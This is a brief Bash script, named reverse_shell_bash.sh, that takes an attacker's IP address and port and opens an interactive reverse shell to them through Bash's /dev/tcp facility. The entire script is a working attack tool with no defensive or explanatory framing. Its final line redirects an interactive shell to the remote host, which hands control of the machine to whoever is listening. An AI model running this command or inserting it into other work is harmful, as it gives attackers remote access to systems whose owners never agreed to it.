#!/bin/bash
# reverse_shell_bash.sh - Reverse shell using Bash's /dev/tcp facility.
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <attacker_ip> <attacker_port>"
  exit 1
fi
echo "Launching Bash reverse shell to $1:$2..."
bash -i >& /dev/tcp/$1/$2 0>&1
